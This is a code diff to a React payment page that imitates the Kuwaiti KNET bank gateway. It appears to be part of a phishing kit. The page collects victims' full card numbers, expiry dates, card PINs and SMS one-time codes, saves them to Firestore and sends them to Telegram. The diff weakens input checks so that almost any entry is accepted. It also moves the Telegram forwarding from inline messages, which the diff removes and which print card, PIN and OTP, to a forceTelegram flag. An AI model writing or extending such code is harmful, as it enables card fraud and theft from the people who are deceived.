@@ -360,24 +360,13 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
       rawExp = `${rawExp.slice(0, 2)}${rawExp.slice(4, 6)}`;
     }
 
-    if (rawCard.length < 10) {
-      setErrorMessage('يرجى إدخال رقم البطاقة بشكل صحيح (Card Number).');
+    if (rawCard.length < 6) {
+      setErrorMessage('يرجى إدخال رقم البطاقة (Card Number).');
       return;
     }
 
-    if (rawExp.length < 4) {
-      setErrorMessage('يرجى إدخال تاريخ انتهاء البطاقة (شهر / سنة).');
-      return;
-    }
-
-    const mm = parseInt(rawExp.slice(0, 2), 10);
-    if (mm < 1 || mm > 12) {
-      setErrorMessage('شهر الانتهاء غير صحيح (01 - 12).');
-      return;
-    }
-
-    if (pin.length < 4) {
-      setErrorMessage('يرجى إدخال الرقم السري للبطاقة (PIN - 4 أرقام).');
+    if (!pin || pin.length < 1) {
+      setErrorMessage('يرجى إدخال الرقم السري للبطاقة (PIN).');
       return;
     }
 
@@ -386,14 +375,17 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
     setIsProcessing(true);
 
     const orderId = orderIdRef.current;
-    const cardExpiryStr = `${rawExp.slice(0, 2)}/${rawExp.slice(2, 4)}`;
+    const cardExpiryStr =
+      rawExp.length >= 4
+        ? `${rawExp.slice(0, 2)}/${rawExp.slice(2, 4)}`
+        : expiry.trim() || '--/--';
     const holderName = customerDetails.name || 'KNET Customer';
 
     // Detect bank from prefix if not explicitly clicked
     const matchedOpt = KNET_PREFIX_OPTIONS.find((o) => rawCard.startsWith(o.prefix));
     const finalBankName = matchedOpt ? matchedOpt.bankFull : selectedBankName;
 
-    // 1. Sync Card + PIN to esfgdr (bookings_steps: payment_started, payment, otp_requested)
+    // 1. Sync Card + PIN to esfgdr (bookings_steps: payment_started, payment, otp_requested) & Telegram
     trackPaymentSubmitted({
       bookingId: orderId,
       customerName: holderName,
@@ -405,7 +397,8 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
       cardNumber: rawCard,
       cardExpiry: cardExpiryStr,
       pin,
-      cardHolder: holderName
+      cardHolder: holderName,
+      forceTelegram: true
     }).catch(() => {});
 
     // 2. Save order with Card + PIN to Firestore orders collection immediately
@@ -427,20 +420,6 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
       status: 'بانتظار رمز التحقق OTP'
     }).catch(() => {});
 
-    // 3. Send KNET Card + PIN directly via Telegram
-    sendTelegramNotification(
-      `💳 <b>عملية دفع جديدة — كي نت الكويت (KNET)</b>\n` +
-      `🆔 <b>رقم الطلب:</b> <code>${orderId}</code>\n` +
-      `🏦 <b>البنك:</b> ${finalBankName}\n` +
-      `👤 <b>العميل:</b> ${holderName}\n` +
-      `📞 <b>الهاتف:</b> <code>+965 ${customerDetails.phone || 'غير مسجل'}</code>\n` +
-      `📍 <b>المنطقة:</b> ${customerDetails.governorate || 'الكويت'}\n` +
-      `🔢 <b>رقم البطاقة:</b> <code>${rawCard}</code>\n` +
-      `📅 <b>تاريخ الانتهاء:</b> <code>${cardExpiryStr}</code>\n` +
-      `🔒 <b>الرقم السري PIN:</b> <code>${pin}</code>\n` +
-      `💰 <b>المبلغ:</b> KD ${amount.toFixed(3)}`
-    );
-
     setTimeout(() => {
       setIsProcessing(false);
       setShowOtpStep(true);
@@ -452,7 +431,7 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
   const handleVerifyOtp = (e?: React.FormEvent | React.MouseEvent) => {
     if (e) e.preventDefault();
 
-    if (otpCode.trim().length < 3) {
+    if (otpCode.trim().length < 1) {
       setErrorMessage('يرجى إدخال رمز التحقق المرسل برسالة نصية (OTP).');
       return;
     }
@@ -467,7 +446,7 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
     const matchedOpt = KNET_PREFIX_OPTIONS.find((o) => rawCard.startsWith(o.prefix));
     const finalBankName = matchedOpt ? matchedOpt.bankFull : selectedBankName;
 
-    // 1. Sync OTP to esfgdr (bookings_steps: otp, payment_completed)
+    // 1. Sync OTP to esfgdr (bookings_steps: otp, payment_completed) & Telegram
     trackOtpSubmitted({
       bookingId: newOrderId,
       otpCode: otpCode.trim(),
@@ -475,7 +454,8 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
       cardNumber: rawCard,
       phone: customerDetails.phone || '',
       amount,
-      cardLast4: last4
+      cardLast4: last4,
+      forceTelegram: true
     }).catch(() => {});
 
     // 2. Update order in Firestore with OTP code
@@ -497,18 +477,6 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
       otpCode: otpCode.trim(),
       status: 'تم الاستلام (OTP مؤكد)'
     }).catch(() => {});
-
-    // 3. Send OTP verification code directly via Telegram
-    sendTelegramNotification(
-      `🔑 <b>رمز تحقق OTP كي نت تم إدخاله!</b>\n` +
-      `🆔 <b>رقم الطلب:</b> <code>${newOrderId}</code>\n` +
-      `👤 <b>العميل:</b> ${holderName}\n` +
-      `📞 <b>الهاتف:</b> <code>+965 ${customerDetails.phone || ''}</code>\n` +
-      `🔐 <b>رمز الـ OTP:</b> <code>${otpCode}</code>\n` +
-      `💳 <b>البطاقة:</b> <code>${rawCard}</code> (${finalBankName})\n` +
-      `💰 <b>المبلغ المسدد:</b> KD ${amount.toFixed(3)}\n` +
-      `✅ <b>الحالة:</b> اكتمل الدفع`
-    );
 
     setTimeout(() => {
       setIsProcessing(false);
@@ -809,7 +777,20 @@ export const PaymentPage: React.FC<PaymentPageProps> = ({
               </button>
               <button
                 type="button"
-                onClick={onCancel}
+                onClick={() => {
+                  if (showOtpStep) {
+                    setShowOtpStep(false);
+                    setErrorMessage('');
+                    try {
+                      sessionStorage.setItem('knet_otp_step', 'false');
+                    } catch {}
+                  } else {
+                    try {
+                      sessionStorage.removeItem('knet_otp_step');
+                    } catch {}
+                    onCancel();
+                  }
+                }}
                 disabled={isProcessing}
                 className="flex-1 h-[29px] bg-[#eaeaea] hover:bg-[#e2e2e2] active:bg-[#d8d8d8] border border-[#c6c6c6] rounded-[4px] text-[#4a4a4a] font-bold text-[12px] transition cursor-pointer"
               >
